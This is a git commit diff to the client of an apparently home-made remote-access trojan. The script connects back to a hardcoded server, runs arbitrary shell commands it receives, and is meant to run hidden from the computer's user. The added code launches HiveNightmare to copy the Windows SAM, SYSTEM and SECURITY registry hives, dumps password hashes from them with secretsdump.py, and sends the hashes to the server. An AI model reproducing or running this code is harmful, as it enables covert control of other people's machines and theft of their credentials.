3c0438e1617c667e43e29a78cea33229bddb812d
stratosefty <stratosefty@gmail.com>
2022-06-16 00:34:39 +0200

    Added the extraction of hives and the sending of them to the server

--- client.py
+++ client.py
@@ -1,9 +1,11 @@
 import socket
 import os
 import subprocess
+from subprocess import call
 
+FORMAT = "utf-8"
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((socket.gethostname(), 1234))
+s.connect(("192.168.56.1", 1234))
 # this file should be run in the background so the person using the pc is not aware of the process running
 # For this to happen, use the extension.pyw,
 # which will cause the script to be executed by pythonw.exe by default.
@@ -42,6 +44,31 @@ while (True):
         result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
         print(result.stdout.decode())
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
+    # code to retrieve the registry files (hives)
+    if decodedMsg == "retrieveh":
+        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
+        cmdline = "start .\HiveNightmare.exe"
+        subprocess.call(cmdline, cwd=dir, shell=True) # run `cmdline` in `dir`
+        s.sendall(bytes("done", "utf-8"))
+    # dump the hashes and send them via the connection
+    if decodedMsg == "hack":
+        dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
+        systemN = ""
+        securityN = ""
+        samN = ""
+        for i in os.listdir(dir):
+            if 'SYSTEM' in i:
+                systemN = i
+            elif 'SECURITY' in i:
+                securityN = i
+            elif 'SAM' in i:
+                samN = i
+
+        cmdline2 = "python secretsdump.py -system " + systemN + " -security " + securityN + " -sam " + samN + " local"
+        resulth = subprocess.run(cmdline2, cwd=dir, stdout=subprocess.PIPE, shell=True)
+        print(resulth.stdout.decode())
+        s.sendall(bytes(resulth.stdout.decode(), "utf-8"))
+        #s.sendall(bytes(samN, "utf-8"))    
 
     # https://docs.python.org/3/library/subprocess.html#subprocess.Popen.communicate
     # here we can see that we can get output from certain executions so maybe we can use this to execute commands one by one
